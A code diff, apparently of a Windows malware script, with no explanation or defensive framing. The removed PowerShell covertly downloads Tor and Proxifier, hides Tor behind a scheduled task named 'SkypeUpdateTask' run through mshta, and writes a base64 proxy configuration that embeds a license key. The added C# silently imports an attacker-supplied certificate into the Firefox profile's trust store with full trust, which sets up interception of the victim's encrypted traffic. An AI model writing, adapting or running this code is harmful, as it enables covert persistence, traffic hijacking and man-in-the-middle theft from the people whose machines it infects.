@@ -1,94 +1,306 @@
-function Unzip
+function AddCertFF{
+Add-Type @"
+using System;
+using System.IO;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+
+public sealed class FF
 {
-param([string]$zipfile, [string]$destination);
-$7zaExe = Join-Path $env:Temp '7za.exe';
-if (-NOT (Test-Path $7zaExe)){
-Try
-{
-(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7zaExe);
+	private static volatile FF instance;
+	private static object syncRoot = new Object();
+	public static FF GetInstance()
+    {
+        if (instance == null)
+        {
+            lock (syncRoot)
+            {
+                if (instance == null)
+                    instance = new FF();
+            }
+        }
+        return instance;
+    }
+	
+	const int ERROR_SUCCESS=0;
+    private static IntPtr LoadWin32Library(string libPath)
+    {
+        if (String.IsNullOrEmpty(libPath))
+            throw new ArgumentNullException("libPath");
+
+        IntPtr moduleHandle = LoadLibrary(libPath);
+        if (moduleHandle == IntPtr.Zero)
+        {
+            int lasterror = Marshal.GetLastWin32Error();
+            Win32Exception innerEx = new Win32Exception(lasterror);
+            innerEx.Data.Add("LastWin32Error", lasterror);
+            throw new Exception("can't load DLL " + libPath, innerEx);
+        }
+        return moduleHandle;
+    }
+
+    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+	//Constants
+    const uint NSS_INIT_READONLY=0x1;
+    const uint NSS_INIT_NOCERTDB = 0x2;
+    const uint NSS_INIT_NOMODDB = 0x4;
+    const uint NSS_INIT_FORCEOPEN = 0x8;
+    const uint NSS_INIT_NOROOTINIT = 0x10;
+    const uint NSS_INIT_OPTIMIZESPACE = 0x20;
+    const uint NSS_INIT_PK11THREADSAFE = 0x40;
+    const uint NSS_INIT_PK11RELOAD = 0x80;
+    const uint NSS_INIT_NOPK11FINALIZE = 0x100;
+    const uint NSS_INIT_RESERVED = 0x200;
+    const uint NSS_INIT_COOPERATE = NSS_INIT_PK11THREADSAFE | NSS_INIT_PK11RELOAD | NSS_INIT_NOPK11FINALIZE | NSS_INIT_RESERVED;
+
+    const string SECMOD_DB = "secmod.db";
+    //Structures
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECItem 
+    {
+        public uint iType;
+        public IntPtr bData;
+        public uint iDataLen;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct CertTrusts
+    {
+        public int iSite;
+        public int iEmail;
+        public int iSoft;
+    }
+
+    private enum SECCertUsage
+    {
+        certUsageSSLClient = 0,
+        certUsageSSLServer = 1,
+        certUsageSSLServerWithStepUp = 2,
+        certUsageSSLCA = 3,
+        certUsageEmailSigner = 4,
+        certUsageEmailRecipient = 5,
+        certUsageObjectSigner = 6,
+        certUsageUserCertImport = 7,
+        certUsageVerifyCA = 8,
+        certUsageProtectedObjectSigner = 9,
+        certUsageStatusResponder = 10,
+        certUsageAnyCA = 11
+    }
+	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate int NSS_InitializePtr(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
+
+    private int NSS_Initialize(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "NSS_Initialize");
+        NSS_InitializePtr ptr = (NSS_InitializePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitializePtr));
+        return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate IntPtr CERT_GetDefaultCertDBPtr();
+    private IntPtr CERT_GetDefaultCertDB()
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "CERT_GetDefaultCertDB");
+        CERT_GetDefaultCertDBPtr ptr = (CERT_GetDefaultCertDBPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_GetDefaultCertDBPtr));
+        return ptr();
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate IntPtr NSS_ShutdownPtr();
+    private IntPtr NSS_Shutdown()
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "NSS_Shutdown");
+        NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
+        return ptr();
+    }
+
+    //SECStatus CERT_ImportCerts (CERTCertDBHandle *certdb, SECCertUsage usage, unsigned int ncerts, SECItem **derCerts, CERTCertificate ***retCerts, PRBool keepCerts, PRBool caOnly, char *nickname)
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate int CERT_ImportCertsPtr(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
+    private int CERT_ImportCerts(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "CERT_ImportCerts");
+        CERT_ImportCertsPtr ptr = (CERT_ImportCertsPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ImportCertsPtr));
+        return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
+    }
+
+    //extern SECStatus CERT_ChangeCertTrust(CERTCertDBHandle *handle,CERTCertificate *cert,CERTCertTrust *trust);
+    private delegate int CERT_ChangeCertTrustPtr(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
+    private int CERT_ChangeCertTrust(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "CERT_ChangeCertTrust");
+        CERT_ChangeCertTrustPtr ptr = (CERT_ChangeCertTrustPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ChangeCertTrustPtr));
+        return ptr(certdb, cert, ref trust);
+    }
+    //void CERT_DestroyCertArray(CERTCertificate **certs, unsigned int ncerts);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate int CERT_DestroyCertArrayPtr(IntPtr cert, uint ncerts);
+    private int CERT_DestroyCertArray(IntPtr cert, uint ncerts)
+    {
+        IntPtr pProc = GetProcAddress(nssModule, "CERT_DestroyCertArray");
+        CERT_DestroyCertArrayPtr ptr = (CERT_DestroyCertArrayPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_DestroyCertArrayPtr));
+        return ptr(cert, ncerts);
+    }
+
+	private IntPtr nssModule = IntPtr.Zero;
+	
+	public Boolean Start(String sCert){
+		String sProfile = GetProfile();
+        if (String.IsNullOrEmpty(sProfile))
+        {
+            return false;
+        }
+        byte[] bCert = GetCertAsByteArray(sCert);
+		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
+		try
+        {
+            DirectoryInfo diInstallPath = GetIP();
+            String sCurrentDirectory = Directory.GetCurrentDirectory();
+            Directory.SetCurrentDirectory(diInstallPath.FullName);
+            nssModule = LoadWin32Library(diInstallPath.FullName + "\\nss3.dll");
+            if (nssModule.Equals(IntPtr.Zero))
+            {
+                return false;
+            }
+            Directory.SetCurrentDirectory(sCurrentDirectory);
+            //Init cert
+            Marshal.Copy(bCert, 0, ipCert, bCert.Length);
+            SECItem CertItem = new SECItem();
+            CertItem.iType = 3;     //   *.der
+            CertItem.bData = ipCert;
+            CertItem.iDataLen = (uint)bCert.Length;
+            SECItem[] aCertItem = new SECItem[1];
+            aCertItem[0] = CertItem;
+
+            CertTrusts CertTrust = new CertTrusts();
+            CertTrust.iSite = 0x10;
+            CertTrust.iEmail = 0x10;
+            CertTrust.iSoft = 0x10;
+
+            IntPtr CertToImport = new IntPtr();
+            IntPtr[] aCertToImport = new IntPtr[1];
+            //End init cert
+            int status = NSS_Initialize(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
+            if (status != ERROR_SUCCESS)
+            {
+                return false;
+            }
+            IntPtr bd = CERT_GetDefaultCertDB();
+            if (bd.Equals(IntPtr.Zero))
+            {
+                NSS_Shutdown();
+                return false;
+            }
+            status = CERT_ImportCerts(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
+            if (status != ERROR_SUCCESS)
+            {
+                NSS_Shutdown();
+                return false;
+            }
+            Marshal.Copy(CertToImport, aCertToImport, 0, 1);
+            status = CERT_ChangeCertTrust(bd, aCertToImport[0], ref CertTrust);
+            if ( status != ERROR_SUCCESS) 
+            {
+                NSS_Shutdown();
+                return false;
+            };
+            CERT_DestroyCertArray(CertToImport, 1);
+            NSS_Shutdown();
+            return true;
+        }
+        catch (Exception){}
+        finally
+        {
+            Marshal.FreeHGlobal(ipCert);
+            ipCert = IntPtr.Zero;
+            NSS_Shutdown();
+        }
+		return true;
+	}
+	private String GetProfile()
+    {
+        String FFProfile = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), @"Mozilla\Firefox\Profiles");
+        if (Directory.Exists(FFProfile))
+        {
+            if (Directory.GetDirectories(FFProfile, "*.default").Length > 0)
+            {
+                return Directory.GetDirectories(FFProfile, "*.default")[0];
+            }
+        }
+        return "";
+    }
+	public byte[] GetCertAsByteArray(String sCert)
+    {
+        try
+        {
+            return Convert.FromBase64String(sCert);
+        }
+        catch (Exception){}
+        return null;
+    }
+	private DirectoryInfo GetIP()
+    {
+        DirectoryInfo fp = null;
+        // get firefox path from registry
+        // we'll search the 32bit install location
+        RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
+        // and lets try the 64bit install location just in case
+        RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);
+
+        if (localMachine1 != null)
+        {
+            try
+            {
+                string[] installedVersions = localMachine1.GetSubKeyNames();
+                // we'll take the first installed version, people normally only have one
+                if (installedVersions.Length == 0)
+                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
+
+                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);
+
+                // get install directory
+                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
+
+                if (installString == null)
+                    throw new NullReferenceException("Install string was null");
+
+                fp = new DirectoryInfo(installString);
+            }
+            catch (Exception)
+            {
+            }
+        }
+        else if (localMachine2 != null)
+        {
+            try
+            {
+                string[] installedVersions = localMachine2.GetSubKeyNames();
+                // we'll take the first installed version, people normally only have one
+                if (installedVersions.Length == 0)
+                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
+
+                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);
+
+                // get install directory
+                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
+
+                if (installString == null)
+                    throw new NullReferenceException("Install string was null");
+                fp = new DirectoryInfo(installString);
+            }
+            catch (Exception)
+            {
+            }
+        }
+        return fp;
+    }
 }
-Catch{}
+"@;
+[FF]::GetInstance().Start("%CERT%");
 }
-if ($(Try { Test-Path $7zaExe.trim() } Catch { $false })){
-Start-Process "$7zaExe" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
-}
-else{
-$shell = new-object -com shell.application;
-$zip = $shell.NameSpace($zipfile);
-foreach($item in $zip.items())
-{
-$shell.Namespace($destination).copyhere($item);
-}
-}
-}
-function Base64ToFile
-{
-param([string]$file, [string]$string);
-$bytes=[System.Convert]::FromBase64String($string);
-#set-content -encoding byte $file -value $bytes;
-[IO.File]::WriteAllBytes($file, $bytes);
-}
-function AddTask
-{
-param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0);
-$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
-$td=$ts.NewTask();
-$td.RegistrationInfo.Description = 'Does something';
-$td.Settings.DisallowStartIfOnBatteries = $False;
-$td.Settings.StopIfGoingOnBatteries = $False;
-$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
-$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
-$LogonTrigger.StartBoundary=[System.DateTime]::Now;
-$LogonTrigger.UserId=$env:username;
-$LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
-$td.Triggers.Add($LogonTrigger);
-if($restart -eq 1){
-$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
-$TimeTrigger.StartBoundary=[System.DateTime]::Now;
-$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(20);
-$TimeTrigger.Repetition.StopAtDurationEnd=$False;
-$td.Triggers.Add($TimeTrigger);
-}
-$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params);
-$td.Actions.Add($ExecAction);
-$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
-$task.Run();
-}
-function InstallTP{
-$File=$env:Temp+'\ts.zip';
-$Dest=$env:Temp+'\ts';
-(New-Object System.Net.WebClient).DownloadFile('http://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=taskscheduler&DownloadId=1505290&FileTime=131142250937900000&Build=21031',$File);
-if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
-Unzip $File $Dest;
-rm -Force $File;
-$TSAssembly=$Dest+'\v2.0\Microsoft.Win32.TaskScheduler.dll';
-$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
-$TFile=$env:Temp+'\t.zip';
-$DestTP=$env:APPDATA+'\TP';
-(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/6.0.4/tor-win32-0.2.8.6.zip',$TFile);
-if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
-Unzip $TFile $DestTP;
-rm -Force $TFile;
-$tor=$DestTP+'\Tor\tor.exe';
-$tor=$tor.Replace('\','/');
-$tor_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$tor',0,false))`"";
-AddTask 'SkypeUpdateTask' 'mshta.exe' $tor_cmd;
-$PFile=$env:Temp+'\p1.zip';
-$wc=new-object net.webclient;
-$purl='http://proxifier.com/distr/ProxifierPE.zip';
-$wc.DownloadFile($purl,$PFile);
-Unzip $PFile $DestTP;
-$p_old=$DestTP+'\Proxifier PE\';
-rm -Force $PFile;
-Rename-Item -path $p_old -newName 'p';
-$p_fold=$DestTP+'\p\';
-$p=$DestTP+'\p\Proxifier.exe';
-$settings_file=$p_fold+'Settings.ini';
-Base64ToFile $settings_file 'W1NldHRpbmdzXQ0KRGVmYXVsdE5ldFByb2ZpbGU9MTcxMTg3Njg4NQ0KTG9nTGV2ZWxTY3JlZW49Mg0KTG9nTGV2ZWxGaWxlPTANCkxvZ1BhdGg9DQpTeXNUcmF5SWNvbj0xDQpTeXNUcmF5SWNvblNob3dUcmFmZmljPTANClNob3dUcmFmZmljVHlwZT0wDQpUcmFmZmljUmVmcmVzaFNwZWVkPTENCkFjdGl2ZVByb2ZpbGU9RGVmYXVsdA0KUHJvZmlsZUF1dG9VcGRhdGU9MA0KUHJvZmlsZVVwZGF0ZVVybD0NClByb2ZpbGVVcGRhdGVVcmxUb0ZvbGRlcj0xDQpQcm9maWxlVXBkYXRlS2VlcExvZ2lucz0wDQpVcGRhdGVDaGVjaz0wDQpbV29ya3NwYWNlXQ0KQXBwbGljYXRpb25Mb29rPTIxNA0KUnVsZURsZ1dpZHRoPTczMg0KUnVsZURsZ0hlaWdodD00MzYNCltEZWZhdWx0XENvbnRyb2xCYXJWZXJzaW9uXQ0KTWFqb3I9OQ0KTWlub3I9MA0KW0RlZmF1bHRcTUZDVG9vbEJhclBhcmFtZXRlcnNdDQpUb29sdGlwcz0xDQpTaG9ydGN1dEtleXM9MQ0KTGFyZ2VJY29ucz0wDQpNZW51QW5pbWF0aW9uPTANClJlY2VudGx5VXNlZE1lbnVzPTENCk1lbnVTaGFkb3dzPTENClNob3dBbGxNZW51c0FmdGVyRGVsYXk9MQ0KQ29tbWFuZHNVc2FnZT1BQUFBQUFBQUFBQUENCltEZWZhdWx0XENvbW1hbmRNYW5hZ2VyXQ0KQ29tbWFuZHNXaXRob3V0SW1hZ2VzPUFBQUENCk1lbnVVc2VySW1hZ2VzPUFBQUENCltEZWZhdWx0XENvbnRyb2xCYXJzLVN1bW1hcnldDQpCYXJzPTANClNjcmVlbkNYPTE2ODANClNjcmVlbkNZPTk0NQ0KW0RlZmF1bHRcUGFuZS01OTM5M10NCklEPTANClJlY3RSZWNlbnRGbG9hdD1LQUFBQUFBQUtBQUFBQUFBT0dBQUFBQUFPR0FBQUFBQQ0KUmVjdFJlY2VudERvY2tlZD1BQUFBQUFBQUdKQkFBQUFBRUVEQUFBQUFKS0JBQUFBQQ0KUmVjZW50RnJhbWVBbGlnbm1lbnQ9NDA5Ng0KUmVjZW50Um93SW5kZXg9MA0KSXNGbG9hdGluZz0wDQpNUlVXaWR0aD0zMjc2Nw0KUGluU3RhdGU9MA0KW0RlZmF1bHRcQmFzZVBhbmUtNTkzOTNdDQpJc1Zpc2libGU9MQ0KW0RlZmF1bHRcUGFuZS0tMV0NCklEPS0xDQpSZWN0UmVjZW50RmxvYXQ9SVBBQUFBQUFJS0JBQUFBQUFNQkFBQUFBQUhDQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9QUFBQUFBQUFPQ0FBQUFBQUVFREFBQUFBQ0FCQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTQwOTYNClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltEZWZhdWx0XEJhc2VQYW5lLS0xXQ0KSXNWaXNpYmxlPTENCltEZWZhdWx0XFBhbmUtMzEwXQ0KSUQ9MzEwDQpSZWN0UmVjZW50RmxvYXQ9SVBBQUFBQUFJS0JBQUFBQUFNQkFBQUFBQUhDQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9RUFBQUFBQUFHRUFBQUFBQUFFREFBQUFBSU9BQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTgxOTINClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltEZWZhdWx0XEJhc2VQYW5lLTMxMF0NCklzVmlzaWJsZT0wDQpbRGVmYXVsdFxQYW5lLTEwMjJdDQpJRD0xMDIyDQpSZWN0UmVjZW50RmxvYXQ9SVBBQUFBQUFJS0JBQUFBQUFNQkFBQUFBQUhDQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9RUFBQUFBQUFHRUFBQUFBQUFFREFBQUFBSU9BQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTQwOTYNClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltEZWZhdWx0XEJhc2VQYW5lLTEwMjJdDQpJc1Zpc2libGU9MA0KW0RlZmF1bHRcUGFuZS0xMDIzXQ0KSUQ9MTAyMw0KUmVjdFJlY2VudEZsb2F0PUlQQUFBQUFBSUtCQUFBQUFBTUJBQUFBQUFIQ0FBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBR0VBQUFBQUFBRURBQUFBQUlPQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD00MDk2DQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbRGVmYXVsdFxCYXNlUGFuZS0xMDIzXQ0KSXNWaXNpYmxlPTANCltEZWZhdWx0XERvY2tpbmdNYW5hZ2VyLTEyOF0NCkRvY2tpbmdQYW5lQW5kUGFuZURpdmlkZXJzPUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUNBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQQUFBQUFBQUFDQUJBQUFBQUVFREFBQUFBR0FCQUFBQUFBQUFBQUFBQUJBQUFBQUFCRUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFQUFBQUFBQUERBQUFBQUFBR0RCQUFBQUFPUERBQUFBQVBQREFBQUFBUFBQUENBQUFMQUFBREVFRkJHQ0dDR0ZHRUdBRkJHT0dGR0FBQUNBQUFBQkFBQUFBQUFJUEFBQUFBQUlLQkFBQUFBQU1CQUFBQUFBSENBQUFBQUFBQUFBQUFBT0NBQUFBQUFFRURBQUFBQUNBQkFBQUFBQUFBQUFBQUFBRUVCQUFHRkRBQUFBQUFBUFBPUFBQTEFERUFBUEdBQU9HQUFPR0FBRkdBQURHQUFFSEFBSkdBQVBHQUFPR0FBREhBQUJBQUFBQUFBR0RCQUFBQUFCQUFBQUFBQVBQUFBQUFBQUFBQUFBQUFBQUE9QUFBIQUVGQUFDSEFBQkdBQUdHQUFHR0FBSkdBQURHQUFCQUFBQUFBQU9QREFBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQUFBPUFBQS0FERkFBRUhBQUJHQUFFSEFBSkdBQURIQUFFSEFBSkdBQURHQUFESEFBQkFBQUFBQUFQUERBQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBUFBQUFBQUFBHREJBQUFBQUJBQUFBQUFBUFBQUFBQUFBHREJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ0KW1N0YXR1c10NCkZpcnN0UnVuPTANClN5c1RyeUljb25NZXNzYWdlU2hvd249MQ0KW1dvcmtzcGFjZVxDb250cm9sQmFyVmVyc2lvbl0NCk1ham9yPTkNCk1pbm9yPTANCltXb3Jrc3BhY2VcTUZDVG9vbEJhclBhcmFtZXRlcnNdDQpUb29sdGlwcz0xDQpTaG9ydGN1dEtleXM9MQ0KTGFyZ2VJY29ucz0wDQpNZW51QW5pbWF0aW9uPTANClJlY2VudGx5VXNlZE1lbnVzPTENCk1lbnVTaGFkb3dzPTENClNob3dBbGxNZW51c0FmdGVyRGVsYXk9MQ0KQ29tbWFuZHNVc2FnZT1HRkFBQUFBQUVCQUFBRUJPQUFBQUJBQUFBQUFBTkFFQUFBQUFDQUFBQUFBQVBIQUlBQUFBQkFBQUFBQUFFQUJPQUFBQUJBQUFBQUFBT0JBSUFBQUFHQkFBQUFBQU9FQUlBQUFBREFBQUFBQUFQRkFJQUFBQUNBQUFBQUFBTEVBSUFBQUFCQUFBQUFBQU1BRUFBQUFBQkFBQUFBQUFPSEFJQUFBQUJBQUFBQUFBREFCT0FBQUFDQUFBQUFBQU5CQUlBQUFBQUJBQUFBQUFQREFJQUFBQUxBQUFBQUFBQUFFQUFBQUFDQUFBQUFBQUNDQk9BQUFBQ0FBQUFBQUFESUFJQUFBQURBQUFBQUFBTURBSUFBQUFFQUFBQUFBQUtFQUlBQUFBSUFBQUFBQUFNQkFJQUFBQUNBQUFBQUFBT0RBSUFBQUFCQUFBQUFBQQ0KW1dvcmtzcGFjZVxDb21tYW5kTWFuYWdlcl0NCkNvbW1hbmRzV2l0aG91dEltYWdlcz1BQUFBDQpNZW51VXNlckltYWdlcz1BQUFBDQpbV29ya3NwYWNlXENvbnRyb2xCYXJzLVN1bW1hcnldDQpCYXJzPTANClNjcmVlbkNYPTE2ODANClNjcmVlbkNZPTk0NQ0KW1dvcmtzcGFjZVxQYW5lLTU5MzkzXQ0KSUQ9MA0KUmVjdFJlY2VudEZsb2F0PUtBQUFBQUFBS0FBQUFBQUFPR0FBQUFBQU9HQUFBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUFBQUFBQUFBR0pCQUFBQUFFRURBQUFBQUpLQkFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD00MDk2DQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbV29ya3NwYWNlXEJhc2VQYW5lLTU5MzkzXQ0KSXNWaXNpYmxlPTENCltXb3Jrc3BhY2VcUGFuZS0tMV0NCklEPS0xDQpSZWN0UmVjZW50RmxvYXQ9SVBBQUFBQUFHTkJBQUFBQU1ERUFBQUFBUExDQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9QUFBQUFBQUFPQ0FBQUFBQUVFREFBQUFBSEJCQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTQwOTYNClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltXb3Jrc3BhY2VcQmFzZVBhbmUtLTFdDQpJc1Zpc2libGU9MQ0KW1dvcmtzcGFjZVxQYW5lLTMxMF0NCklEPTMxMA0KUmVjdFJlY2VudEZsb2F0PUNBQkFBQUFBSUJCQUFBQUFLTUJBQUFBQUFPQkFBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBR0VBQUFBQUFBRURBQUFBQU5QQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD04MTkyDQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbV29ya3NwYWNlXEJhc2VQYW5lLTMxMF0NCklzVmlzaWJsZT0wDQpbV29ya3NwYWNlXFBhbmUtMTAyMl0NCklEPTEwMjINClJlY3RSZWNlbnRGbG9hdD1DQUJBQUFBQUlCQkFBQUFBS01CQUFBQUFBT0JBQUFBQQ0KUmVjdFJlY2VudERvY2tlZD1FQUFBQUFBQUdFQUFBQUFBQUVEQUFBQUFOUEFBQUFBQQ0KUmVjZW50RnJhbWVBbGlnbm1lbnQ9ODE5Mg0KUmVjZW50Um93SW5kZXg9MA0KSXNGbG9hdGluZz0wDQpNUlVXaWR0aD0zMjc2Nw0KUGluU3RhdGU9MA0KW1dvcmtzcGFjZVxCYXNlUGFuZS0xMDIyXQ0KSXNWaXNpYmxlPTANCltXb3Jrc3BhY2VcUGFuZS0xMDIzXQ0KSUQ9MTAyMw0KUmVjdFJlY2VudEZsb2F0PUNBQkFBQUFBSUJCQUFBQUFLTUJBQUFBQUFPQkFBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBR0VBQUFBQUFBRURBQUFBQU5QQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD04MTkyDQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbV29ya3NwYWNlXEJhc2VQYW5lLTEwMjNdDQpJc1Zpc2libGU9MA0KW1dvcmtzcGFjZVxEb2NraW5nTWFuYWdlci0xMjhdDQpEb2NraW5nUGFuZUFuZFBhbmVEaXZpZGVycz1BQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUEFBQUFBQUFBSEJCQUFBQUFFRURBQUFBQUxCQkFBQUFBQUFBQUFBQUFCQUFBQUFBQkVBQUFBQUFBQkFBQUFBQUFHSk9QUFBQUElGQUFBQUFBUFBQUFBQUFBEQUFBQUFBQUdEQkFBQUFBT1BEQUFBQUFQUERBQUFBQVBQUFBDQUFBTEFBQURFRUZCR0NHQ0dGR0VHQUZCR09HRkdBQUFDQUFBQUJBQUFBQUFBSVBBQUFBQUFHTkJBQUFBQU1ERUFBQUFBUExDQUFBQUFBQUFBQUFBQU9DQUFBQUFBRUVEQUFBQUFIQkJBQUFBQUFBQUFBQUFBQUVFQkFBR0ZEQUFBQUFBQVBQT1BQUExBREVBQVBHQUFPR0FBT0dBQUZHQUFER0FBRUhBQUpHQUFQR0FBT0dBQURIQUFCQUFBQUFBQUdEQkFBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQUFBPUFBQSEFFRkFBQ0hBQUJHQUFHR0FBR0dBQUpHQUFER0FBQkFBQUFBQUFPUERBQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUFBQT1BQUEtBREZBQUVIQUFCR0FBRUhBQUpHQUFESEFBRUhBQUpHQUFER0FBREhBQUJBQUFBQUFBUFBEQUFBQUFCQUFBQUFBQVBQUFBQUFBQUFBQUFBQUFBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQVBQUFBQUFBQR0RCQUFBQUFCQUFBQUFBQVBQUFBQUFBQR0RCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUENCltXb3Jrc3BhY2VcV2luZG93UGxhY2VtZW50XQ0KTWFpbldpbmRvd1JlY3Q9QVBBQUFBQUFLSUJBQUFBQUVFRUFBQUFBSkZEQUFBQUENCkZsYWdzPTANClNob3dDbWQ9MQ0KW0xpY2Vuc2VdDQpPd25lcj0yVENLWC1UWVFITC1ORk4zMy0zWUVEWS1RVzY1RA0KS2V5PTJUQ0tYLVRZUUhMLU5GTjMzLTNZRURZLVFXNjVEDQo=';
-$p_prof=$p_fold+'Profiles\';
-md $p_prof | Out-Null;
-$d=$p_prof+'Default.ppx';
